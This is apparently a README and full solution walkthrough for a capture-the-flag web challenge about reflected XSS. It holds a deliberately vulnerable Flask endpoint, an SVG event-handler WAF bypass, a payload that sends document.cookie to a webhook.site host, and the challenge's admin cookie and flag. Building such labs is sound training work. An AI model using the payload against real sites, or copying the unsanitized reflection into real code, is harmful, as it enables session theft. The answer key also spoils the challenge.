# 🕷️ Venom Echo — Reflective XSS Cookie Steal CTF

**Category:** Web Application Security  
**Difficulty:** Medium (300 Points)  
**Flag Format:** `DAKSHH{flag}`

> *"Intelligence reports confirm a rogue hacker has taken over a vital corporate dashboard. He wiped the data, but he's careless. He still checks his incident reports. Find the injection point, poison his view, and echo his session cookie right back to yourself."*

---

## Challenge Overview

This challenge tests your ability to exploit a **Reflected Cross-Site Scripting (XSS)** vulnerability, **bypass a basic WAF filter**, **steal the admin's cookie** using a simulated admin bot, and **impersonate the admin** to retrieve the flag.

The application features:
1. **WAF/Filter:** Simple tags like `<script>`, `<iframe>`, `<embed>`, and `<object>` are blocked. Players must find alternative XSS vectors (e.g., event handlers).
2. **Admin Bot (Puppeteer):** A real cookie-stealing simulation — players submit malicious URLs to a `/report` endpoint, and a headless browser (with admin cookies set) visits the link.
3. **Cookie-Based Authentication:** The flag is only revealed when the correct admin cookie (`_ga`) is present in the browser.

### Hints for Players
- **Hint 1:** Look at the dashboard URL carefully. There's more than one dashboard endpoint...
- **Hint 2:** The WAF blocks common tags, but HTML has many tags with event handlers. Think `<svg>`, `<img>`, `<body>`, etc.
- **Hint 3:** You need a way to catch outgoing requests. Services like [webhook.site](https://webhook.site/) are your friends.
- **Hint 4:** Once you have the admin's cookie, you don't need the admin's password. Just set the cookie in your own browser.

---

## 🔧 How to Start the Challenge Room (Step-by-Step)

### Prerequisites
- **Python 3.x** installed
- **Node.js** installed (for the Puppeteer admin bot)
- **pip** and **npm** package managers

### Step 1: Install Python Dependencies
```bash
pip install flask
```

### Step 2: Install Node.js Dependencies (Admin Bot)
Navigate to the challenge directory and install Puppeteer:
```bash
cd "d:\HITK_CTF\CTF-Dakshh\Web App - CTF - JK\Reflective-xss-cookie-steal-ctf"
npm install
```
This installs `puppeteer` — a headless Chrome browser used by the admin bot to visit submitted URLs.

> **Note:** Puppeteer will download a Chromium binary on first install (~170 MB). If `node_modules` already exists, this step is already done.

### Step 3: (Optional) Delete Old Database for Fresh Start
```bash
del users.db
```
The database is automatically recreated on server startup with the admin user.

### Step 4: Start the Challenge Room
```bash
python app.py
```

**Expected terminal output:**
```
 * Serving Flask app 'app'
 * Running on http://127.0.0.1:5007
```

**What happens at startup:**
- SQLite database `users.db` is created (if not exists) with the admin user `admin@wctf.com`
- Flask web server starts on **port 5007**

### Step 5: Access the Challenge Room
Open your browser and go to:
```
http://127.0.0.1:5007
```

**What the player sees:**
- A **Login/Signup** page with tabbed interface
- After login: a **Dashboard** with a story about a hacked website, a logout button, and a **"Report malicious activity to Admin"** link

### Step 6: Stop the Room (When Done)
Press `Ctrl + C` in the terminal.

---

## 📁 File Structure & Roles

| File | Role | Who Sees It? |
|------|------|-------------|
| `app.py` | Flask server — handles auth, dashboard, XSS endpoint, report endpoint | Admin only (source) |
| `bot.js` | Puppeteer admin bot — visits submitted URLs with admin cookies set | Admin only |
| `solve.py` | Automated solver script | Admin only |
| `users.db` | SQLite database (auto-created with admin user) | Auto-generated |
| `requirements.txt` | Python dependencies | Admin only |
| `package.json` | Node.js dependencies (Puppeteer) | Admin only |
| `templates/login.html` | Login & Signup page | Players (via browser) |
| `templates/dashboard.html` | Dashboard page (shows flag if admin cookie present) | Players (via browser) |
| `templates/report.html` | Report URL to admin bot page | Players (via browser) |
| `static/styles/` | CSS and JS for the login page | Players (via browser) |

---

## 📌 How the Challenge Application Works (Internals)

### Pages / Routes

| Route | Method | What It Does |
|-------|--------|-------------|
| `/` | GET | Login/Signup page |
| `/signup` | POST | Registers a new user in SQLite |
| `/login` | POST | Authenticates user, sets session |
| `/dashboard` | GET | Dashboard page. If cookie `_ga` = admin's value → shows flag |
| `/deshboard` | GET | **THE VULNERABLE ENDPOINT** — reflects `?name=` parameter in HTML (with WAF) |
| `/report` | GET/POST | Submit a URL for the admin bot to visit |
| `/logout` | GET | Destroys session |

### The Vulnerability (`/deshboard` — Line 88-121 of `app.py`)
```python
@app.route("/deshboard", methods=["GET", "POST"])
def fake_dashboard():
    name = request.args.get('name')
    # WAF blocks: script, iframe, object, applet, embed, form
    return '<h1> Hello {} </h1>'.format(name)  # Direct HTML injection!
```
The `name` parameter is reflected directly into the HTML response without sanitization. The WAF only blocks a few common tags.

### WAF Bypass
Blocked tags: `script`, `iframe`, `object`, `applet`, `embed`, `form`

**NOT blocked:** `<svg>`, `<img>`, `<body>`, `<details>`, `<marquee>`, `<math>`, `<input>`, etc.

### The Admin Bot (`bot.js`)
When a player submits a URL to `/report`, Flask spawns `node bot.js <URL>`. The bot:
1. Launches headless Chromium
2. Sets the admin cookie: `_ga = YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5` on `127.0.0.1`
3. Also sets a `flag` cookie with the actual flag value
4. Navigates to the submitted URL
5. Waits 3 seconds (for XSS payloads to execute)
6. Closes the browser

### Cookie Check (`/dashboard` — Line 71-86 of `app.py`)
```python
cook = request.cookies.get('_ga')
if cook == 'YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5':
    return render_template("dashboard.html", flag='DAKSHH{...}')
```

---

## 🔑 Writeup — How to Solve (Player Walkthrough)

### Step 1: Register and Login
1. Open `http://127.0.0.1:5007`
2. Click the **Signup** tab
3. Register with any email/password (e.g., `test@test.com` / `password123`)
4. Login with those credentials
5. You land on the **Dashboard**

### Step 2: Discover the Vulnerable Endpoint
1. On the dashboard, look for a hidden link — there's an invisible link to `/deshboard` (note the typo: "desh" not "dash")
2. Navigate to: `http://127.0.0.1:5007/deshboard`
3. You'll see a code snippet revealing the endpoint takes a `name` parameter
4. Try: `http://127.0.0.1:5007/deshboard?name=test`
5. You see: `Hello test` — the input is reflected in the page!

### Step 3: Test for XSS
1. Try: `http://127.0.0.1:5007/deshboard?name=<script>alert(1)</script>`
2. **Blocked!** WAF says: `WAF Blocked your payload: script detected`
3. The WAF blocks: `script`, `iframe`, `object`, `applet`, `embed`, `form`

### Step 4: Bypass the WAF
Use an **SVG tag with an event handler** (not in the blocklist):
```
http://127.0.0.1:5007/deshboard?name=<svg/onload=alert(1)>
```
✅ **Alert pops up!** XSS confirmed.

### Step 5: Set Up Webhook to Catch Cookies
1. Go to [https://webhook.site](https://webhook.site/)
2. Copy your unique URL (e.g., `https://webhook.site/abc123-def456-...`)

### Step 6: Craft the Cookie-Stealing Payload
Build a payload that sends `document.cookie` to your webhook:
```
<svg/onload=fetch("https://webhook.site/YOUR-ID/?c="+document.cookie)>
```

Full URL (URL-encode as needed):
```
http://127.0.0.1:5007/deshboard?name=<svg/onload=fetch("https://webhook.site/YOUR-ID/?c="+document.cookie)>
```

### Step 7: Submit to Admin Bot
1. Go to `http://127.0.0.1:5007/report`
2. Paste the full XSS URL into the form
3. Click **"Send to Admin"**
4. You'll see: `Admin is reviewing your link...`

The admin bot visits your URL with admin cookies set → the XSS executes → cookies are sent to your webhook.

### Step 8: Capture the Admin Cookie
1. Go back to your **webhook.site** tab
2. You should see an incoming GET request with query parameter `c=`
3. The cookie value will contain: `_ga=YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5`

### Step 9: Set the Admin Cookie in Your Browser
1. Open DevTools (F12) → **Console** tab
2. Type:
   ```javascript
   document.cookie = "_ga=YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5; path=/"
   ```
3. Press Enter

### Step 10: Get the Flag
1. Navigate to `http://127.0.0.1:5007/dashboard`
2. The server checks the `_ga` cookie → matches the admin value
3. 🏆 **Flag is displayed:** `DAKSHH{GrEaT_yOu_ReCoVeReD_tHiS_sItE_2026}`

---

## 🛡️ Admin Verification (Quick Test)

### Using `solve.py`
```bash
python solve.py
```
This script:
1. Creates a test user and logs in
2. Manually sets the admin cookie (`_ga = YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5`)
3. Accesses `/dashboard` and verifies the flag appears

**Expected output:**
```
1. Creating user and logging in...
2. Simulating stolen Admin Cookie...
3. Accessing Dashboard with Admin Cookie...
SUCCESS! Found Flag!
DAKSHH{GrEaT_yOu_ReCoVeReD_tHiS_sItE_2026}
```

### Manual Admin Test
1. Start the server → Login as any user
2. Open DevTools Console → set cookie: `document.cookie = "_ga=YWRtaW5fY29va2llc19pc192ZXJ5X3Rhc3R5; path=/"`
3. Go to `/dashboard` → Flag appears

---

## ⚠️ Important Notes
- The `/deshboard` endpoint (with typo) is the vulnerable one, NOT `/dashboard`. Players must discover this.
- The admin bot needs **Node.js** and **Puppeteer** installed. Without it, the `/report` endpoint will return an error.
- The bot sets cookies on `domain: '127.0.0.1'` — if the challenge is deployed on a different host, update `bot.js` line 33.
- Cookie `_ga` is named to look like a Google Analytics cookie — this is intentional misdirection.
- The database `users.db` is auto-created. Delete it to reset all registered users.

---

Contributor : Jyotirmoy Karmakar(0xjyotirmoy)
